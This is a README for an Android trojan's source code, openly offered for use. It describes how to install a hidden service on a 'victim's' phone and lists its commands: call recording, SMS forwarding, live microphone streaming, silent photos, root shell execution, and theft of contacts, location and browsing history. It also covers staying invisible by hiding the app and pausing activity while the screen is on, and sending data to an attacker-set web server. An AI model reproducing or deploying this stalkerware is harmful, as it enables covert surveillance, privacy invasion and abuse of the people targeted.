# Android Trojan (Built with Android SDK 22) source code
Android trojan with abilities of remote control,root commands execution, recording and online sound streaming

Compatible with all Android from Gingerbread (API 10) up to Lollipop (API 22)

----DESCRIPTION----

This is a concept of Android remote control and wiretapping tool (trojan with several functions).
It consists of server and client parts.

The client part's code should be put to your webhosting (the folder named "html").
It's recommended to set rw- privileges on all files.

----INSTALLATION----

The actual server part is a service apk and starter apk. The service should be installed on victim's device first. After that you need to install starter and choose one of two options.
either install as root, or non-root install. After that the starter is no longer needed and should be uninstalled. (for example via button in the bottom left of the screen).

Once it's done, the hidden service should be started automatically with boot.
It wont be seen in installed apk's at all if it's installed as root (and it wont be possible to kill its process completely if the user doesnt know about root features and how to use them)

What server actually does:

Records all phone calls and tries to upload them to your web-server in 3gp format every 3 hours (the uploaded files simply should be renamed to <original_filename>.3gp)

Sends you the copy of all incoming sms in real time if the internet was available at that moment.

When the screen is turned off if the internet is available, it back connects to your web-server and periodically checks for new commands. The commands are as following:

------------COMMMANDS----------

Command :   - execute regular shell command on the victim's device 

Upload file :  - should be filled with full path to the file that will be uploaded to logs/ directory on your server

Spec commands:

root [command]    -  try to execute command as root (if device is rooted)

sms  - get all sms dump from device

download [file_url]  - download file from the specified url onto device (into app's data/files directory)

restart  - restarts the service

loc - get last known location  (active location isnt used because it can be too alarming for victim)

info - get basic informaion such as current connection type,battery level, available memory and service provider name

record [secs] - record sound from the mic for amount of seconds (will be saved to data/files/logs)

stream [ip] [port]  - start real-time streaming sound from the device's mic via udp to your listening computer * (client is described later)

sync - upload all files that were logged to the app's files/logs directory

quit - end shell session

clear - clear data/logs directory

photo - silently make photos from all available cameras on device (1 from each) and save them to files/logs

calllogs - get victim call's history

bookmarks = get bookmarks from the system browser

history - get browsing history from the system browser 

screenshot -  make a screenshot of the device's current screen (works on rooted device only)

getcontacts  - get contact list with names and numbers from the device

sendsms [number] [text]  - send sms to specified number with some text


For the purposes of preserving invisibility all the "bad" activity is stopped once the device screen is on (except for call recording and incoming sms'es copies sending). This way it wont disturb user and decrease the probability of them starting to suspect something.

------IMPORTANT-------


Before the compilation and use, change the value of the variable 
final static String site = "http://192.168.100.27/"; in the MyService.java file to your web-server host with slash in the end, for example
"http://yourwebserver.com/" . It also should be the root path where the contents of html folder should be put. 

* The source of the streamer client is in file streamer.java
* The source of the starter.apk is in file starter.java

have fun!

Upd. 11.09.2016  New Update is coming. New features in the upcoming version:
* Lots of optimisation
*  non-root full factory format support :)
*  OTP encryption support
*  silent execution of ussd codes
*  more interesting root features ^^
